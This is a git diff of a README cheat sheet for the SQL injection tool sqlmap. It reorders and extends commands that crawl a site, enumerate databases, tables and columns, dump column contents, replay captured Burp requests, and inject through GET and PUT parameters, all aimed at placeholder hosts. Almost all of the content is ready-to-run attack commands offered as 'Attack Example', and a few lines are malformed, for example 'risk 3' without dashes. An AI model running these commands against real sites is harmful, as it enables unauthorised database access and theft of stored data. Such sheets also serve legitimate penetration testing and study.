@@ -1,12 +1,17 @@
 # SQLmapCheatSheet
-# Attack Example:-
-    $ sqlmap -u www.site.com/ --crawl 2 --batch
+# Attack Example:
     $ sqlmap -u www.site.com/index.php?id=1 -- batch --dbs
     $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name --tables
     $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name -T table_name --columns
     $ sqlmap -u www.site.com/index.php?id=1 -- batch -D database_name -T table_name -C columns_name1,columns_name2,columns_name3 --dump
-    
     $ sqlmap -r burpsuite_copy_to_file.txt -p username --batch --dump
+    
+    $ sqlmap -u www.site.com/ --crawl 2 --batch
+    $ sqlmap -u www.site.com/ --crawl 2 --batch --technique="U"
+    $ sqlmap -u www.site.com/ --crawl 2 --batch risk 3
+    $ sqlmap -u www.site.com/ --crawl 2 --batch risk 3 --level 5
+    $ sqlmap -u www.site.com/ --crawl 2 --batch -v 4
+    
 
 
 
@@ -48,9 +53,14 @@ Internal
 
 
 ## Injection place
--   From BurpSuite/ZAP capture
--   Capture the request and create a req.txt file!
--   [sqlmap -r req.txt --current-user]
+                            
+    $ sqlmap -u www.site.com/index.php?id=1 -- batch --dbs
+    
+    
+    
+   ##                 $ From BurpSuite/ZAP capture
+## Capture the request and create a req.txt file!
+```[sqlmap -r req.txt --current-user]```
 
 ## GET Request Injection
 -   sqlmap -u "http://example.com/?id=1" -p id
@@ -71,8 +81,6 @@ Internal
 ## PUT Method
 -  sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
 -  <!--The injection is located at the '*'-->
-
-
 
 
 
